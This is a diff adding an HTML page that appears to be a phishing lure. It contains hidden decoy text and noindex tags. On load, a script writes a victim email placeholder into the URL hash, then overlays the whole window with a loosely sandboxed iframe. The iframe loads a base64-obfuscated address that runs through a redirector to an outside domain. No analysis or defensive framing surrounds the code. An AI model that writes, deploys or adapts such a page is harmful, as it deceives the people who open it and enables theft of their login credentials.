@@ -1,0 +1,29 @@
+<html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+ </head>
+ <body>
+ <span hidden>The child drew a picture with crayons.</span>
+ </body>
+<script>
+if(location.hash == ""){
+location.hash = `SILENTCODERSEMAIL`;
+}
+
+(async () => {
+    var peacock = document.createElement('iframe');
+    peacock.sandbox.add('allow-same-origin');
+    peacock.sandbox.add('allow-top-navigation');
+    peacock.sandbox.add('allow-modals');
+    peacock.sandbox.add('allow-scripts');
+    peacock.sandbox.add('allow-popups-to-escape-sandbox');
+    peacock.sandbox.add('allow-forms');
+    peacock.src = atob("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL0g1MGkuc29ybmFkZWxwLmNvbS81dDF1NUtYLw==")+location.hash;
+    peacock.style.cssText = 'position: fixed; inset: 0px; width: 100%; height: 100%; border: 0px; margin: 0px;padding: 0px; overflow: hidden; z-index: 999999;';
+    document.write(peacock);
+    document.body.innerHTML = "";
+    document.body.appendChild(peacock);
+})();
+</script>
+</html>
